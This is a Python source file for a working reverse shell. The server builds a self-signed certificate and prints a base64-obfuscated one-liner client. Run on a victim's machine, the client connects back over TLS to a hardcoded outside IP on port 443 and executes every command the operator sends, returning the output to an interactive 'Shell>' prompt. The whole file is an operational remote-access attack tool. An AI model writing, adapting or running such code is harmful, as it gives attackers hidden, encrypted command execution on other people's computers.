import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
from threading import Thread
import hmac
import hashlib
from Crypto.PublicKey import RSA  # insure the installation of pycryptodome

def keys__check(ip_add, password):
    """
    Generate RSA keys 
    """
    keys_diriection = "keys"
    os.makedirs(keys_diriection, exist_ok=True)
    
    #if keys existing remove it 
    for file in os.listdir(keys_diriection):
        file_path = os.path.join(keys_diriection, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
    print("  keys is  removed ")

    #  RSA keys with 2048_bit  Generate
    key = RSA.generate(2048)
    
    # create the private key
    private_key_path = os.path.join(keys_diriection, "private_key.pem")
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    
    # create public key
    public_key_path = os.path.join(keys_diriection, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    
    # create SSl certificate 
    c_path = os.path.join(keys_diriection, "server1.crt")
    create_certificate(private_key_path, c_path, ip_add) 
    
    # Generate client code with password
    create_client_code = c_client_code(ip_add, 443, password)
    print("\n[** Start Client Code **]")
    print(f"python -c \"{create_client_code}\"")
    print("[** end the  Client Code **]\n")

    return c_path, private_key_path

def create_certificate(private_key_path, c_path, ip_add):
    """
    create self-signed certificate  
    """
    openssl_config = "openssl.cnf"
    
    # Create OpenSSL config file
    with open(openssl_config, "w") as f:
        f.write(f"""
[ req ]
distinguished_name = wireless_security
x509_extensions = v3_req
prompt = no

[ wireless_security ]
C = ES
ST = Barcelona
L = Manresa
O = kg
OU = IT
CN = {ip_add}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_add}
""")
    
    try:
        # Generate certificate using OpenSSL
        run([
            "openssl", "req", "-new", "-x509",
            "-key", private_key_path,
            "-out", c_path,
            "-days", "400",
            "-config", openssl_config
        ], check=True)
        print(" Certificate created successfully !")
    except CalledProcessError as e:
        print(f"[!!] OpenSSL Error Exit: {e}")
    finally:
        if os.path.exists(openssl_config):
            os.remove(openssl_config)

def c_client_code(ip, port, password):
    """
    Read the certificate that has been created
    """
    certfile = os.path.join("keys", "server1.crt")
    with open(certfile, "r") as f:
        auth_key = f.read()

    client_code = f"""
import socket, ssl, subprocess, hmac, hashlib
CERT=\"\"\"{auth_key}\"\"\"
PASSWORD = b"{password}"
def connect():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    try:
        with socket.create_connection(("{ip}", {port})) as sock:
            with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
                # Authentication phase
                nonce = ssock.recv(16)
                hmac_res = hmac.new(PASSWORD, nonce, hashlib.sha256).digest()
                ssock.send(hmac_res)
                auth_status = ssock.recv(12)
                if auth_status != b"AUTH_SUCCESS":
                    raise Exception("Authentication failed")
                # Command loop
                while True:
                    cmd = ssock.recv(8192).decode()
                    if cmd.lower() == "exit":
                        break
                    output = subprocess.getoutput(cmd)
                    ssock.sendall(output.encode())
    except Exception as e:
        print(f"Connection error: {{e}}")
connect()
"""

    
    
    return f"import base64;exec(base64.b64decode('{base64.b64encode(client_code.encode()).decode()}'))"

def handle_client(client_socket, password):
    """
    Handle client authentication and commands
    """
    try:
        # Send challenge
        nonce = os.urandom(16)
        client_socket.send(nonce)
        
        # Get response
        hmac_res = client_socket.recv(32)
        
        # Verify HMAC
        correct_hmac = hmac.new(password.encode(), nonce, hashlib.sha256).digest()
        if not hmac.compare_digest(hmac_res, correct_hmac):
            client_socket.send(b"AUTH_FAILED")
            raise Exception("Authentication failed")
        
        client_socket.send(b"AUTH_SUCCESS")
        print("[+] Client authenticated")
        
        # Command loop
        while True:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            client_socket.send(cmd.encode())
            if cmd.lower() in ["exit", "quit"]:
                break
            output = client_socket.recv(8192).decode()
            print(output)
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_server(ip, port, password):
    """
    Start server with authentication
    """
    cert, key = keys__check(ip, password)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert, keyfile=key)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((ip, port))
        sock.listen(5)
        print(f"[*] Listening on {ip}:{port}")
        
        with context.wrap_socket(sock, server_side=True) as ssock:
            while True:
                client, addr = ssock.accept()
                print(f"[+] Connection from {addr}")
                Thread(target=handle_client, args=(client, password)).start()

if __name__ == "__main__":
    server_ip = "178.62.237.181"  # ← ضع ال IP هنا
    password = input("[!] Set authentication password: ").strip()
    start_server(server_ip, 443, password)